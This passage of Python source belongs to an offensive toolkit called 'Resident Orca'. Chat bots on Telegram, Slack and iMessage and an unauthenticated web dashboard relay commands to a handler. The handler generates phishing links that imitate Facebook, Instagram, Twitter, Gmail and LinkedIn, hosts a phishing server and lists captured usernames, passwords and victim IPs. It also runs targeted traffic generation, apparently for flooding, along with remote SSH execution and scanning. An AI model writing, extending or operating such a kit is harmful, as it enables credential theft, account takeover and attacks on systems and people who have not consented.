                if result.get('success'):
                    data = result.get('data', {})
                    await event.reply(f"🎣 Phishing server started!\nURL: {data.get('url')}")
                else:
                    await event.reply(f"❌ {result.get('output', 'Failed')}")
            
            @self.client.on(events.NewMessage(pattern='/phish_creds'))
            async def phish_creds_handler(event):
                result = self.handler.execute("phishing_credentials")
                if result.get('success'):
                    creds = result.get('data', [])
                    if creds:
                        msg = f"🎣 **Captured Credentials ({len(creds)})**\n"
                        for cred in creds[:5]:
                            msg += f"📧 {cred.get('username')}: ||{cred.get('password')}|| (from {cred.get('ip_address')})\n"
                        await event.reply(msg[:4000])
                    else:
                        await event.reply("No captured credentials yet.")
                else:
                    await event.reply(f"❌ {result.get('output', 'Failed')}")
            
            self.running = True
            await self.client.start(bot_token=self.config['bot_token'])
            print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
            await self.client.run_until_disconnected()
            return True
            
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Telegram bot in thread"""
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self._run_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_bot(self):
        """Run bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot thread error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        config_file = os.path.join(CONFIG_DIR, "slack_config.json")
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {"enabled": False, "bot_token": "", "channel_id": "", "prefix": "!"}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = "!") -> bool:
        config = {"bot_token": bot_token, "channel_id": channel_id, "enabled": enabled, "prefix": prefix}
        with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
            json.dump(config, f, indent=4)
        self.config = config
        return True
    
    def start(self):
        """Start Slack bot"""
        if not SLACK_AVAILABLE:
            return False
        
        if not self.config.get('bot_token'):
            return False
        
        try:
            self.client = WebClient(token=self.config['bot_token'])
            response = self.client.auth_test()
            
            if response['ok']:
                print(f"{Colors.SUCCESS}✅ Slack bot connected as {response['user']}{Colors.RESET}")
                self.running = True
                
                # Start monitoring thread
                thread = threading.Thread(target=self._monitor, daemon=True)
                thread.start()
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Slack bot error: {e}")
            return False
    
    def _monitor(self):
        """Monitor Slack for commands"""
        import time
        while self.running:
            try:
                if self.config.get('channel_id'):
                    response = self.client.conversations_history(channel=self.config['channel_id'], limit=5)
                    if response['ok']:
                        for msg in response['messages']:
                            if 'text' in msg and msg['text'].startswith(self.config.get('prefix', '!')):
                                cmd = msg['text'][1:].strip()
                                result = self.handler.execute(cmd, "slack")
                                self.client.chat_postMessage(
                                    channel=self.config['channel_id'],
                                    text=f"```{result.get('output', 'Command executed')[:1000]}```"
                                )
                time.sleep(5)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_alert(self, message: str):
        """Send alert to Slack"""
        if self.running and self.client and self.config.get('channel_id'):
            try:
                self.client.chat_postMessage(channel=self.config['channel_id'], text=f"🚨 {message}")
            except:
                pass
    
    def start_bot_thread(self):
        """Start Slack bot in thread"""
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# IMESSAGE BOT (macOS)
# =====================
class IMessageBot:
    """iMessage bot integration (macOS only)"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.watched_numbers = []
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        config_file = os.path.join(CONFIG_DIR, "imessage_config.json")
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {"enabled": False, "phone_numbers": [], "prefix": "!"}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = "!") -> bool:
        config = {"phone_numbers": phone_numbers, "enabled": enabled, "prefix": prefix}
        with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
            json.dump(config, f, indent=4)
        self.config = config
        self.watched_numbers = phone_numbers
        return True
    
    def start(self):
        """Start iMessage bot"""
        if platform.system().lower() != 'darwin':
            return False
        
        if not self.config.get('enabled'):
            return False
        
        print(f"{Colors.SUCCESS}✅ iMessage bot started{Colors.RESET}")
        self.running = True
        
        thread = threading.Thread(target=self._monitor, daemon=True)
        thread.start()
        return True
    
    def _monitor(self):
        """Monitor iMessage for commands"""
        import time
        last_checked = {}
        
        while self.running:
            try:
                for number in self.watched_numbers:
                    # Use osascript to get messages
                    script = f'''
                    tell application "Messages"
                        set targetBuddy to buddy "{number}"
                        set recentMessages to messages of targetBuddy
                        set messageText to ""
                        repeat with msg in recentMessages
                            set messageText to content of msg
                            exit repeat
                        end repeat
                        return messageText
                    end tell
                    '''
                    result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0 and result.stdout:
                        message = result.stdout.strip()
                        last_time = last_checked.get(number, '')
                        if message and message != last_time:
                            last_checked[number] = message
                            if message.startswith(self.config.get('prefix', '!')):
                                cmd = message[1:].strip()
                                output = self.handler.execute(cmd, "imessage")
                                self._send_message(number, f"```{output.get('output', 'Executed')[:500]}```")
                
                time.sleep(5)
            except Exception as e:
                logger.error(f"iMessage monitor error: {e}")
                time.sleep(10)
    
    def _send_message(self, recipient: str, message: str):
        """Send iMessage"""
        try:
            script = f'''
            tell application "Messages"
                set targetBuddy to buddy "{recipient}"
                send "{message}" to targetBuddy
            end tell
            '''
            subprocess.run(['osascript', '-e', script], timeout=10)
        except Exception as e:
            logger.error(f"Failed to send iMessage: {e}")
    
    def start_bot_thread(self):
        """Start iMessage bot in thread"""
        if self.config.get('enabled') and self.watched_numbers and platform.system().lower() == 'darwin':
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# WEB APPLICATION DASHBOARD
# =====================
class WebDashboard:
    """Flask web dashboard for Resident Orca"""
    
    def __init__(self, command_handler, db: DatabaseManager, traffic_gen: TrafficGenerator, social_tools: SocialEngineeringTools):
        self.handler = command_handler
        self.db = db
        self.traffic_gen = traffic_gen
        self.social_tools = social_tools
        self.app = None
        self.running = False
        self.port = 5000
        
        if FLASK_AVAILABLE:
            self._setup_app()
    
    def _setup_app(self):
        """Setup Flask application"""
        self.app = Flask(__name__)
        self.app.secret_key = os.urandom(24)
        
        # HTML template as string
        self.html_template = self._get_html_template()
        
        @self.app.route('/')
        def index():
            return render_template_string(self.html_template)
        
        @self.app.route('/api/execute', methods=['POST'])
        def api_execute():
            data = request.get_json()
            command = data.get('command', '')
            result = self.handler.execute(command, "web")
            return jsonify({
                'success': result.get('success', False),
                'output': result.get('output', ''),
                'data': result.get('data', {}),
                'execution_time': result.get('execution_time', 0)
            })
        
        @self.app.route('/api/status', methods=['GET'])
        def api_status():
            stats = self.db.get_statistics()
            threats = self.db.get_recent_threats(5)
            commands = self.db.get_command_history(10)
            traffic_active = self.traffic_gen.get_active()
            
            return jsonify({
                'statistics': stats,
                'recent_threats': threats,
                'recent_commands': commands,
                'active_traffic': traffic_active,
                'phishing_server_running': self.social_tools.server_running,
                'phishing_server_url': self.social_tools.get_server_url()
            })
        
        @self.app.route('/api/commands', methods=['GET'])
        def api_commands():
            limit = request.args.get('limit', 20, type=int)
            commands = self.db.get_command_history(limit)
            return jsonify(commands)
        
        @self.app.route('/api/threats', methods=['GET'])
        def api_threats():
            limit = request.args.get('limit', 20, type=int)
            threats = self.db.get_recent_threats(limit)
            return jsonify(threats)
        
        @self.app.route('/api/ips', methods=['GET'])
        def api_ips():
            ips = self.db.get_managed_ips()
            return jsonify(ips)
        
        @self.app.route('/api/phishing/links', methods=['GET'])
        def api_phishing_links():
            links = self.social_tools.get_active_links()
            return jsonify(links)
        
        @self.app.route('/api/phishing/credentials', methods=['GET'])
        def api_phishing_creds():
            link_id = request.args.get('link_id')
            creds = self.social_tools.get_captured_credentials(link_id)
            return jsonify(creds)
        
        @self.app.route('/api/traffic/types', methods=['GET'])
        def api_traffic_types():
            types = self.traffic_gen.get_available_types()
            return jsonify({'types': types})
        
        @self.app.route('/api/traffic/active', methods=['GET'])
        def api_traffic_active():
            active = self.traffic_gen.get_active()
            return jsonify(active)
    
    def _get_html_template(self) -> str:
        """Get HTML dashboard template"""
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resident Orca | Cyber Security Command Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Roboto', monospace; }
        body { background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c); min-height: 100vh; padding: 2rem 1.5rem; color: #eef5ff; }
        .orca-container { max-width: 1400px; margin: 0 auto; }
        .header { display: flex; align-items: baseline; justify-content: space-between; flex-wrap: wrap; margin-bottom: 2rem; border-bottom: 2px solid #1e90ff; padding-bottom: 0.75rem; }
        .logo-area { display: flex; align-items: center; gap: 12px; }
        .orca-icon { font-size: 2.8rem; color: #1e90ff; text-shadow: 0 0 8px #0a4c7a; }
        h1 { font-size: 2.2rem; font-weight: 700; background: linear-gradient(135deg, #ffffff, #7ec8ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .badge { background: #0f172a; padding: 0.3rem 0.9rem; border-radius: 40px; font-size: 0.8rem; border-left: 3px solid #1e90ff; color: #b9e2ff; }
        .command-panel { background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(16px); border-radius: 32px; border: 1px solid rgba(30, 144, 255, 0.5); padding: 1.8rem 2rem; margin-bottom: 2rem; }
        .section-title { display: flex; align-items: center; gap: 12px; margin-bottom: 1.5rem; font-weight: 600; font-size: 1.4rem; color: #cae9ff; }
        .input-group { display: flex; flex-wrap: wrap; gap: 16px; align-items: flex-end; }
        .input-field { flex: 2; min-width: 200px; }
        .input-field label { display: block; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; margin-bottom: 8px; color: #9bc2e6; }
        .cyber-input { width: 100%; background: #010101cc; border: 1px solid #2c4f6e; border-radius: 18px; padding: 12px 18px; font-size: 0.9rem; color: #f0fcff; font-family: monospace; }
        .cyber-input:focus { outline: none; border-color: #1e90ff; box-shadow: 0 0 8px #1e90ff66; }
        .btn-primary { background: linear-gradient(95deg, #0a2a44, #001b30); border: 1px solid #1e90ff; padding: 10px 24px; border-radius: 40px; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-primary:hover { background: linear-gradient(95deg, #12466e, #002842); transform: translateY(-2px); }
        .stats-grid { display: flex; flex-wrap: wrap; gap: 1rem; margin-bottom: 2rem; }
        .stat-card { background: rgba(0, 0, 0, 0.6); border-radius: 20px; padding: 1rem 1.5rem; flex: 1; min-width: 150px; text-align: center; border: 1px solid #1e3a5f; }
        .stat-card h3 { font-size: 0.8rem; color: #9bc2e6; margin-bottom: 8px; }
        .stat-card .value { font-size: 2rem; font-weight: bold; color: #1e90ff; }
        .insight-grid { display: flex; flex-wrap: wrap; gap: 2rem; margin-bottom: 2rem; }
        .chart-card { flex: 1; min-width: 280px; background: rgba(0, 0, 0, 0.65); border-radius: 28px; border: 1px solid rgba(30, 144, 255, 0.4); padding: 1.2rem; }
        .chart-card h3 { text-align: center; margin-bottom: 1rem; display: flex; align-items: center; justify-content: center; gap: 8px; }
        canvas { max-height: 300px; width: 100% !important; }
        .data-table-wrap { background: rgba(0, 0, 0, 0.6); border-radius: 24px; padding: 1.2rem; margin-bottom: 1rem; }
        .sec-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
        .sec-table th, .sec-table td { text-align: left; padding: 10px 8px; border-bottom: 1px solid #234a6e; }
        .sec-table th { color: #76b9ff; }
        .command-feed { background: rgba(0, 0, 0, 0.6); border-radius: 24px; padding: 1rem 1.5rem; margin-bottom: 2rem; border-left: 4px solid #1e90ff; max-height: 200px; overflow-y: auto; }
        .command-item { padding: 6px 0; border-bottom: 1px dashed #2a4b6e; font-family: monospace; font-size: 0.8rem; }
        .cmd-time { color: #6ba5d0; margin-right: 12px; }
        footer { text-align: center; margin-top: 2rem; font-size: 0.75rem; color: #587b9c; }
        @media (max-width: 720px) { body { padding: 1rem; } }
    </style>
</head>
<body>
<div class="orca-container">
    <div class="header">
        <div class="logo-area">
            <i class="fas fa-whale orca-icon"></i>
            <h1>RESIDENT ORCA</h1>
            <div class="badge"><i class="fas fa-shield-alt"></i> CYBER COMMAND</div>
        </div>
        <div class="badge"><i class="fas fa-chart-simple"></i> Threat Intelligence Core</div>
    </div>

    <div class="command-panel">
        <div class="section-title">
            <i class="fas fa-terminal"></i>
            <span>⚡ SECURITY COMMAND INJECTOR</span>
        </div>
        <div class="input-group">
            <div class="input-field">
                <label><i class="fas fa-tag"></i> COMMAND</label>
                <input type="text" id="commandInput" class="cyber-input" placeholder="e.g., ping 8.8.8.8, scan example.com" autocomplete="off">
            </div>
            <div class="input-field">
                <button id="executeBtn" class="btn-primary"><i class="fas fa-skull-crossbones"></i> EXECUTE</button>
            </div>
        </div>
    </div>

    <div class="stats-grid" id="statsGrid">
        <div class="stat-card"><h3>Total Commands</h3><div class="value" id="statCommands">0</div></div>
        <div class="stat-card"><h3>Threats Detected</h3><div class="value" id="statThreats">0</div></div>
        <div class="stat-card"><h3>Managed IPs</h3><div class="value" id="statIPs">0</div></div>
        <div class="stat-card"><h3>Blocked IPs</h3><div class="value" id="statBlocked">0</div></div>
        <div class="stat-card"><h3>Phishing Links</h3><div class="value" id="statPhishing">0</div></div>
        <div class="stat-card"><h3>Captured Creds</h3><div class="value" id="statCreds">0</div></div>
    </div>

    <div class="insight-grid">
        <div class="chart-card">
            <h3><i class="fas fa-chart-bar"></i> Command Activity</h3>
            <canvas id="activityChart"></canvas>
        </div>
        <div class="chart-card">
            <h3><i class="fas fa-chart-pie"></i> Threat Severity</h3>
            <canvas id="threatChart"></canvas>
        </div>
    </div>

    <div class="command-feed" id="commandFeed">
        <div class="command-item"><span class="cmd-time">--:--:--</span> Waiting for commands...</div>
    </div>

    <div class="data-table-wrap">
        <h3><i class="fas fa-database"></i> Recent Threats</h3>
        <div style="overflow-x: auto;">
            <table class="sec-table" id="threatTable">
                <thead><tr><th>Time</th><th>Type</th><th>Source IP</th><th>Severity</th></tr></thead>
                <tbody id="threatTableBody"><tr><td colspan="4">Loading...</td></tr></tbody>
            </table>
        </div>
    </div>

    <footer><i class="fas fa-robot"></i> Resident Orca • Active threat command suite • Data driven defense</footer>
</div>

<script>
    let activityChart, threatChart;
    
    async function updateStats() {
        try {
            const response = await fetch('/api/status');
            const data = await response.json();
            
            document.getElementById('statCommands').textContent = data.statistics?.total_commands || 0;
            document.getElementById('statThreats').textContent = data.statistics?.total_threats || 0;
            document.getElementById('statIPs').textContent = data.statistics?.total_managed_ips || 0;
            document.getElementById('statBlocked').textContent = data.statistics?.total_blocked_ips || 0;
            document.getElementById('statPhishing').textContent = data.statistics?.active_phishing_links || 0;
            document.getElementById('statCreds').textContent = data.statistics?.captured_credentials || 0;
            
            // Update command feed
            const feedDiv = document.getElementById('commandFeed');
            if (data.recent_commands && data.recent_commands.length) {
                feedDiv.innerHTML = data.recent_commands.slice(0, 10).map(cmd => 
                    `<div class="command-item"><span class="cmd-time">${cmd.timestamp?.slice(11, 19) || '--:--'}</span> ${cmd.command} [${cmd.source}] ${cmd.success ? '✅' : '❌'}</div>`
                ).join('');
            }
            
            // Update threat table
            const threatBody = document.getElementById('threatTableBody');
            if (data.recent_threats && data.recent_threats.length) {
                threatBody.innerHTML = data.recent_threats.slice(0, 10).map(t => `
                    <tr>
                        <td>${t.timestamp?.slice(11, 19) || '--:--'}</td>
                        <td>${t.threat_type || 'Unknown'}</td>
                        <td>${t.source_ip || 'N/A'}</td>
                        <td style="color: ${t.severity === 'critical' ? '#ff4444' : t.severity === 'high' ? '#ff8844' : '#ffaa44'}">${t.severity?.toUpperCase() || 'LOW'}</td>
                    </tr>
                `).join('');
            } else {
                threatBody.innerHTML = '<tr><td colspan="4">No threats detected</td></tr>';
            }
            
            // Update charts
            updateCharts();
        } catch(e) { console.error('Stats update error:', e); }
    }
    
    async function updateCharts() {
        try {
            const threatsRes = await fetch('/api/threats?limit=50');
            const threats = await threatsRes.json();
            
            const severityCount = { critical: 0, high: 0, medium: 0, low: 0 };
            threats.forEach(t => { if (severityCount[t.severity] !== undefined) severityCount[t.severity]++; });
            
            if (threatChart) threatChart.destroy();
            const threatCtx = document.getElementById('threatChart').getContext('2d');
            threatChart = new Chart(threatCtx, {
                type: 'pie',
                data: {
                    labels: ['Critical', 'High', 'Medium', 'Low'],
                    datasets: [{ data: [severityCount.critical, severityCount.high, severityCount.medium, severityCount.low], backgroundColor: ['#ff4444', '#ff8844', '#ffcc44', '#44ff44'] }]
                },
                options: { responsive: true, plugins: { legend: { position: 'bottom', labels: { color: '#cce3ff' } } } }
            });
            
            const cmdsRes = await fetch('/api/commands?limit=30');
            const commands = await cmdsRes.json();
            const last7Days = Array(7).fill(0);
            const now = new Date();
            commands.forEach(cmd => {
                const cmdDate = new Date(cmd.timestamp);
                const diffDays = Math.floor((now - cmdDate) / (1000 * 60 * 60 * 24));
                if (diffDays >= 0 && diffDays < 7) last7Days[6 - diffDays]++;
            });
            
            if (activityChart) activityChart.destroy();
            const activityCtx = document.getElementById('activityChart').getContext('2d');
            activityChart = new Chart(activityCtx, {
                type: 'bar',
                data: {
                    labels: ['6d ago', '5d ago', '4d ago', '3d ago', '2d ago', 'Yesterday', 'Today'],
                    datasets: [{ label: 'Commands', data: last7Days, backgroundColor: '#1e90ff', borderRadius: 8 }]
                },
                options: { responsive: true, scales: { y: { beginAtZero: true, grid: { color: '#1e3a5f' }, ticks: { color: '#b9dcff' } }, x: { ticks: { color: '#b9dcff' } } } }
            });
        } catch(e) { console.error('Chart update error:', e); }
    }
    
    async function executeCommand() {
        const input = document.getElementById('commandInput');
        const command = input.value.trim();
        if (!command) return;
        
        const btn = document.getElementById('executeBtn');
        const originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> EXECUTING';
        btn.disabled = true;
        
        try {
            const response = await fetch('/api/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            });
            const result = await response.json();
            
            if (result.success) {
                const output = typeof result.data === 'object' ? JSON.stringify(result.data, null, 2) : (result.output || 'Executed successfully');
                alert(`✅ Command executed in ${result.execution_time?.toFixed(2)}s\n\n${output.slice(0, 500)}`);
            } else {
                alert(`❌ Command failed\n\n${result.output || 'Unknown error'}`);
            }
            
            input.value = '';
            updateStats();
        } catch(e) {
            alert(`❌ Error: ${e.message}`);
        } finally {
            btn.innerHTML = originalText;
            btn.disabled = false;
            input.focus();
        }
    }
    
    document.getElementById('executeBtn').addEventListener('click', executeCommand);
    document.getElementById('commandInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') executeCommand(); });
    
    setInterval(updateStats, 3000);
    updateStats();
</script>
</body>
</html>"""
    
    def start(self):
        """Start web dashboard"""
        if not FLASK_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return False
        
        try:
            self.running = True
            thread = threading.Thread(target=lambda: self.app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False), daemon=True)
            thread.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://localhost:{self.port}{Colors.RESET}")
            return True
        except Exception as e:
            logger.error(f"Web dashboard error: {e}")
            return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler"""
    
    def __init__(self, db: DatabaseManager, ssh: SSHManager, traffic_gen: TrafficGenerator, nikto: NiktoScanner, social_tools: SocialEngineeringTools):
        self.db = db
        self.ssh = ssh
        self.traffic_gen = traffic_gen
        self.nikto = nikto
        self.social_tools = social_tools
        self.tools = NetworkTools()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict:
        return {
            'time': self._time, 'date': self._date, 'datetime': self._datetime,
            'ping': self._ping, 'scan': self._scan, 'nmap': self._nmap, 'traceroute': self._traceroute,
            'whois': self._whois, 'dns': self._dns, 'location': self._location,
            'system': self._system, 'status': self._status, 'threats': self._threats, 'report': self._report,
            'add_ip': self._add_ip, 'remove_ip': self._remove_ip, 'block_ip': self._block_ip, 'unblock_ip': self._unblock_ip, 'list_ips': self._list_ips,
            'ssh_list': self._ssh_list, 'ssh_connect': self._ssh_connect, 'ssh_disconnect': self._ssh_disconnect,
            'ssh_execute': self._ssh_execute, 'ssh_upload': self._ssh_upload, 'ssh_download': self._ssh_download,
            'generate_traffic': self._generate_traffic, 'traffic_types': self._traffic_types, 'traffic_stop': self._traffic_stop, 'traffic_status': self._traffic_status,
            'nikto': self._nikto, 'nikto_full': self._nikto_full,
            'generate_phishing_link_for_facebook': lambda a: self._phishing_generate('facebook'),
            'generate_phishing_link_for_instagram': lambda a: self._phishing_generate('instagram'),
            'generate_phishing_link_for_twitter': lambda a: self._phishing_generate('twitter'),
            'generate_phishing_link_for_gmail': lambda a: self._phishing_generate('gmail'),
            'generate_phishing_link_for_linkedin': lambda a: self._phishing_generate('linkedin'),
            'phishing_start_server': self._phishing_start, 'phishing_stop_server': self._phishing_stop,
            'phishing_status': self._phishing_status, 'phishing_links': self._phishing_links,
            'phishing_credentials': self._phishing_credentials, 'phishing_qr': self._phishing_qr,
            'analyze_ip': self._analyze_ip
        }
    
    def execute(self, command: str, source: str = "local") -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command'}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                result = self._generic(command)
            
            execution_time = time.time() - start_time
            self.db.log_command(command, source, result.get('success', False), result.get('output', '')[:5000], execution_time)
            result['execution_time'] = execution_time
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            self.db.log_command(command, source, False, str(e), execution_time)
            return {'success': False, 'output': str(e), 'execution_time': execution_time}
    
    def _create_result(self, success: bool, data: Any) -> Dict:
        if isinstance(data, str):
            return {'success': success, 'output': data}
        return {'success': success, 'data': data}
    
    # Time commands
    def _time(self, args): return self._create_result(True, datetime.datetime.now().strftime('%H:%M:%S'))
    def _date(self, args): return self._create_result(True, datetime.datetime.now().strftime('%Y-%m-%d'))
    def _datetime(self, args): return self._create_result(True, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    # Network commands
    def _ping(self, args):
        if not args: return self._create_result(False, "Usage: ping <target>")
        result = self.tools.ping(args[0])
        return self._create_result(result['success'], result['output'])
    
    def _scan(self, args):
        if not args: return self._create_result(False, "Usage: scan <target>")
        result = self.tools.nmap_scan(args[0])
        return self._create_result(result['success'], result['output'])
    
    def _nmap(self, args):
        if not args: return self._create_result(False, "Usage: nmap <target> [ports]")
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(args[0], ports)
        return self._create_result(result['success'], result['output'])
    
    def _traceroute(self, args):
        if not args: return self._create_result(False, "Usage: traceroute <target>")
        result = self.tools.traceroute(args[0])
        return self._create_result(result['success'], result['output'])
    
    def _whois(self, args):
        if not args: return self._create_result(False, "Usage: whois <domain>")
        result = self.tools.whois_lookup(args[0])
        return self._create_result(result['success'], result['output'])
    
    def _dns(self, args):
        if not args: return self._create_result(False, "Usage: dns <domain>")
        result = self.tools.dns_lookup(args[0])
        return self._create_result(result['success'], result['output'])
    
    def _location(self, args):
        if not args: return self._create_result(False, "Usage: location <ip>")
        result = self.tools.get_ip_location(args[0])
        return self._create_result(result.get('success', False), result)
    
    def _system(self, args):
        info = {
            'system': platform.system(), 'release': platform.release(),
            'hostname': socket.gethostname(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': {'total': psutil.virtual_memory().total, 'percent': psutil.virtual_memory().percent},
            'disk': {'total': psutil.disk_usage('/').total, 'percent': psutil.disk_usage('/').percent}
        }
        return self._create_result(True, info)
    
    def _status(self, args):
        stats = self.db.get_statistics()
        return self._create_result(True, {'statistics': stats, 'session_id': 'active'})
    
    def _threats(self, args):
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        return self._create_result(True, threats)
    
    def _report(self, args):
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(5)
        return self._create_result(True, {'statistics': stats, 'recent_threats': threats})
    
    def _add_ip(self, args):
        if not args: return self._create_result(False, "Usage: add_ip <ip>")
        success = self.db.add_managed_ip(args[0])
        return self._create_result(success, f"IP {args[0]} added" if success else f"Failed to add IP {args[0]}")
    
    def _remove_ip(self, args):
        if not args: return self._create_result(False, "Usage: remove_ip <ip>")
        self.db.cursor.execute('DELETE FROM managed_ips WHERE ip_address = ?', (args[0],))
        self.db.conn.commit()
        return self._create_result(True, f"IP {args[0]} removed")
    
    def _block_ip(self, args):
        if not args: return self._create_result(False, "Usage: block_ip <ip> [reason]")
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        firewall_success = self.tools.block_ip_firewall(args[0])
        db_success = self.db.block_ip(args[0], reason)
        return self._create_result(firewall_success or db_success, f"IP {args[0]} blocked")
    
    def _unblock_ip(self, args):
        if not args: return self._create_result(False, "Usage: unblock_ip <ip>")
        firewall_success = self.tools.unblock_ip_firewall(args[0])
        db_success = self.db.unblock_ip(args[0])
        return self._create_result(firewall_success or db_success, f"IP {args[0]} unblocked")
    
    def _list_ips(self, args):
        ips = self.db.get_managed_ips()
        return self._create_result(True, {'ips': ips, 'count': len(ips)})
    
    def _ssh_list(self, args):
        if not self.ssh.is_available():
            return self._create_result(False, "SSH not available. Install paramiko.")
        connections = self.ssh.get_connections()
        return self._create_result(True, {'connections': connections, 'total': len(connections)})
    
    def _ssh_connect(self, args):
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_connect <name> <host> <username> [password]")
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.create_connection(name, host, username, password)
        if self.ssh.connect(conn['id']):
            return self._create_result(True, f"Connected to {host}")
        return self._create_result(False, f"Failed to connect to {host}")
    
    def _ssh_disconnect(self, args):
        if not args: return self._create_result(False, "Usage: ssh_disconnect <name>")
        conns = self.ssh.get_connections()
        for conn in conns:
            if conn['name'] == args[0]:
                self.ssh.disconnect(conn['id'])
                return self._create_result(True, f"Disconnected from {args[0]}")
        return self._create_result(False, f"Connection {args[0]} not found")
    
    def _ssh_execute(self, args):
        if len(args) < 2: return self._create_result(False, "Usage: ssh_execute <name> <command>")
        conns = self.ssh.get_connections()
        for conn in conns:
            if conn['name'] == args[0]:
                if not self.ssh.is_connected(conn['id']):
                    self.ssh.connect(conn['id'])
                result = self.ssh.execute_command(conn['id'], ' '.join(args[1:]))
                return self._create_result(result['success'], result['output'])
        return self._create_result(False, f"Connection {args[0]} not found")
    
    def _ssh_upload(self, args):
        if len(args) < 3: return self._create_result(False, "Usage: ssh_upload <name> <local> <remote>")
        conns = self.ssh.get_connections()
        for conn in conns:
            if conn['name'] == args[0]:
                if not self.ssh.is_connected(conn['id']):
                    self.ssh.connect(conn['id'])
                result = self.ssh.upload_file(conn['id'], args[1], args[2])
                return self._create_result(result['success'], result.get('error', 'Upload successful'))
        return self._create_result(False, f"Connection {args[0]} not found")
    
    def _ssh_download(self, args):
        if len(args) < 3: return self._create_result(False, "Usage: ssh_download <name> <remote> <local>")
        conns = self.ssh.get_connections()
        for conn in conns:
            if conn['name'] == args[0]:
                if not self.ssh.is_connected(conn['id']):
                    self.ssh.connect(conn['id'])
                result = self.ssh.download_file(conn['id'], args[1], args[2])
                return self._create_result(result['success'], result.get('error', 'Download successful'))
        return self._create_result(False, f"Connection {args[0]} not found")
    
    def _generate_traffic(self, args):
        if len(args) < 3: return self._create_result(False, "Usage: generate_traffic <type> <ip> <duration> [port]")
        traffic_type = args[0]
        target_ip = args[1]
        duration = int(args[2])
        port = int(args[3]) if len(args) > 3 else None
        result = self.traffic_gen.generate(traffic_type, target_ip, duration, port)
        return self._create_result(result.get('success', False), result.get('message', result.get('error', 'Failed')))
    
    def _traffic_types(self, args):
        types = self.traffic_gen.get_available_types()
        return self._create_result(True, {'available_types': types, 'count': len(types)})
    
    def _traffic_stop(self, args):
        generator_id = args[0] if args else None
        self.traffic_gen.stop(generator_id)
        return self._create_result(True, "Traffic stopped")
    
    def _traffic_status(self, args):
        active = self.traffic_gen.get_active()
        return self._create_result(True, {'active_generators': active, 'count': len(active)})
    
    def _nikto(self, args):
        if not args: return self._create_result(False, "Usage: nikto <target>")
        result = self.nikto.scan(args[0], "basic")
        return self._create_result(result.get('success', False), result)
    
    def _nikto_full(self, args):
        if not args: return self._create_result(False, "Usage: nikto_full <target>")
        result = self.nikto.scan(args[0], "full")
        return self._create_result(result.get('success', False), result)
    
    def _phishing_generate(self, platform: str):
        result = self.social_tools.generate_phishing_link(platform)
        return self._create_result(result['success'], result)
    
    def _phishing_start(self, args):
        if len(args) < 1: return self._create_result(False, "Usage: phishing_start_server <link_id> [port]")
        link_id = args[0]
